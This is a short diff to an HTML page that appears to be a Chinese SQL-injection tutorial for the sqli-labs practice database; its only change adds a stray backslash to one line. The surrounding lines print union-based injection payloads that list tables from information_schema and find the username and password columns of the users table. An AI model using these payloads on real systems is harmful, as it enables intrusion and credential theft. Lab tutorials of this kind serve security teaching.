@@ -568,7 +568,7 @@ select * from table where id<13 union select 1,2,3;
 <p><code>id=-2&#39; union select 1,table_name,3 from information_schema.tables where table_schema = &#39;security&#39; limit 0,1 --+</code></p>
 <p>查到表名<code>emails，referers，uagents，users</code></p>
 <p><strong>根据表名找到列名</strong></p>
-<p>黑客觉得<code>users</code>里面的数据很有价值</p>
+<p>黑客觉得<code>users</code>里面的数据很有价值\</p>
 <p><code>id=-2&#39; union select 1,column_name,3 from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39; limit 0,1 --+</code></p>
 <p>发现<code>users</code>里有<code>id，username，password</code></p>
 <p>黑客需要拿到所有的<code>username</code>和<code>password</code>的值</p>
